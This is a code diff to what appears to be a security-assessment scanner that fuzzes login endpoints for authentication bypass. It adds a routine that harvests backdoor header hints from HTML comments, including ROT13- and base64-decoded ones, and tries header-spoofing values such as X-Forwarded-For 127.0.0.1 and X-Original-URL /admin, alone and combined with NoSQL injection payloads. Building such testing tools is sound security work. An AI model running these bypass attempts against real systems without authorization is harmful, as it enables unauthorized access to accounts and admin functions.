@@ -13,6 +13,8 @@ response — never on a guess. Read-only in intent: it attempts to log in, it ne
 
 from __future__ import annotations
 
+import base64
+import codecs
 import json as _json
 import re
 import secrets
@@ -143,7 +145,7 @@ def _file(assessment_id, url, kind, payload_desc, gained, evidence):
     with session() as s:
         s.add(Finding(
             id=f"find_{secrets.token_hex(5)}", assessment_id=assessment_id,
-            title="Authentication bypass via login injection",
+            title=f"Authentication bypass via {kind}",
             severity="critical", status="validated", confidence="high",
             endpoint=url, method="POST",
             technical_analysis=(
@@ -164,6 +166,89 @@ def _file(assessment_id, url, kind, payload_desc, gained, evidence):
         s.commit()
 
 
+# developer/backdoor headers that some apps trust for an auth shortcut (name, value)
+_DEV_HEADERS = [("X-Dev-Access", "yes"), ("X-Dev-Access", "true"), ("X-Debug", "true"),
+                ("X-Debug", "1"), ("X-Admin", "true"), ("X-Admin", "1"), ("X-Backdoor", "1"),
+                ("X-Dev", "1"), ("X-Developer", "1"), ("X-Internal", "1"),
+                ("X-Forwarded-For", "127.0.0.1"), ("X-Custom-IP-Authorization", "127.0.0.1"),
+                ("X-Original-URL", "/admin")]
+_HDR_KV = re.compile(r"\b(X-[A-Za-z][A-Za-z0-9-]{1,38})\s*[:=]\s*['\"]?([A-Za-z0-9._/-]{1,40})", re.I)
+_HDR_NAME = re.compile(r"\b(X-[A-Za-z][A-Za-z0-9-]{1,38})\b")
+_HDR_CAP = 14
+
+
+def _rot13(txt: str) -> str:
+    try:
+        return codecs.encode(txt, "rot_13")
+    except Exception:
+        return ""
+
+
+def _candidate_headers(html: str) -> list[tuple[str, str]]:
+    """Dev/backdoor header candidates: harvested from HTML comments (raw, ROT13-decoded, and
+    base64-decoded, since labs hide the hint) first, then a built-in common list."""
+    out: list[tuple[str, str]] = []
+    seen: set[tuple[str, str]] = set()
+
+    def add(name: str, value: str) -> None:
+        k = (name.lower(), value)
+        if k not in seen:
+            seen.add(k)
+            out.append((name, value))
+
+    for m in re.finditer(r"<!--(.*?)-->", html or "", re.S):
+        c = m.group(1)
+        variants = [c, _rot13(c)]
+        for bm in re.finditer(r"[A-Za-z0-9+/]{16,}={0,2}", c):
+            try:
+                variants.append(base64.b64decode(bm.group(0)).decode("utf-8", "ignore"))
+            except Exception:
+                pass
+        for v in variants:
+            for kv in _HDR_KV.finditer(v):
+                add(kv.group(1), kv.group(2))
+            for nm in _HDR_NAME.finditer(v):
+                add(nm.group(1), "yes")          # name with no value -> truthy guess
+    for name, value in _DEV_HEADERS:
+        add(name, value)
+    return out
+
+
+def _header_bypass(assessment_id, t, sandbox, root_html, log) -> bool:
+    """Some logins are gated by a secret dev/backdoor HEADER (often hinted in an HTML comment),
+    sometimes combined with injection. Try candidate headers against a bad login and against the
+    NoSQL payloads; a header that turns a failed login into an authenticated one is the bypass."""
+    url = t["url"]
+    page = (root_html or "") + " " + (_req(sandbox, "GET", url).get("body") or "")
+    cands = _candidate_headers(page)
+    if not cands:
+        return False
+    rnd = secrets.token_hex(4)
+    uf, pf = _field_pairs(t)[0]
+    jh = {"Content-Type": "application/json"}
+    bad = _json.dumps({uf: f"owl{rnd}", pf: f"owl{rnd}"})
+    base = _auth_signal(_req(sandbox, "POST", url, headers=jh, body=bad))
+    for hname, hval in cands[:_HDR_CAP]:
+        hh = {**jh, hname: hval}
+        # (a) the header alone turns a bad login into a success -> pure backdoor
+        if _auth_signal(_req(sandbox, "POST", url, headers=hh, body=bad)) - base:
+            _file(assessment_id, url, f"developer backdoor header ({hname}: {hval})",
+                  f"header {hname}: {hval} (no valid credentials)",
+                  {"backdoor-header"}, f"POST {url}\n{hname}: {hval}\n{bad}")
+            return True
+        # (b) the header UNLOCKS an injection that fails without it (header-gated NoSQL bypass)
+        for uobj, pobj in _NOSQL_PAIRS[:2]:
+            payload = _json.dumps({uf: uobj, pf: pobj})
+            if _auth_signal(_req(sandbox, "POST", url, headers=jh, body=payload)) - base:
+                continue                        # injection already works without the header
+            if _auth_signal(_req(sandbox, "POST", url, headers=hh, body=payload)) - base:
+                _file(assessment_id, url, f"header-gated NoSQL bypass ({hname})",
+                      f"{hname}: {hval} + {uf}={uobj}", {"header+nosql"},
+                      f"POST {url}\n{hname}: {hval}\n{payload}")
+                return True
+    return False
+
+
 def login_authbypass_scan(assessment_id, inventory, sandbox, target, session_headers=None,
                           log: Callable[[str], None] = lambda m: None, cap: int = 12) -> int:
     """Fuzz the login endpoint(s) for SQL / NoSQL authentication bypass. Returns findings filed."""
@@ -182,10 +267,11 @@ def login_authbypass_scan(assessment_id, inventory, sandbox, target, session_hea
     targets = _login_targets(inventory, login_form, target)[:cap]
     if not targets:
         return 0
+    root_html = (_req(sandbox, "GET", target).get("body") or "")[:60000]
     log(f"auth-bypass: fuzzing {len(targets)} login endpoint(s) for SQL/NoSQL bypass")
     filed = 0
     for t in targets:
-        if _probe_one(assessment_id, t, sandbox, log):
+        if _probe_one(assessment_id, t, sandbox, log, root_html):
             filed += 1
     if filed:
         log(f"auth-bypass: {filed} authentication bypass(es) confirmed")
@@ -204,7 +290,7 @@ def _field_pairs(t) -> list[tuple[str, str]]:
     return pairs
 
 
-def _probe_one(assessment_id, t, sandbox, log) -> bool:
+def _probe_one(assessment_id, t, sandbox, log, root_html="") -> bool:
     url, kind = t["url"], t["kind"]
 
     # cheap liveness: a real JSON login API answers a bad login with a non-HTML error; skip a
@@ -260,4 +346,5 @@ def _probe_one(assessment_id, t, sandbox, log) -> bool:
                 _file(assessment_id, url, "NoSQL operator injection", f"{uf}={uobj} {pf}={pobj}",
                       gained, f"POST {url}\n{_json.dumps({uf: uobj, pf: pobj})}")
                 return True
-    return False
+    # no credential-field injection worked — try a secret dev/backdoor HEADER
+    return _header_bypass(assessment_id, t, sandbox, root_html, log)
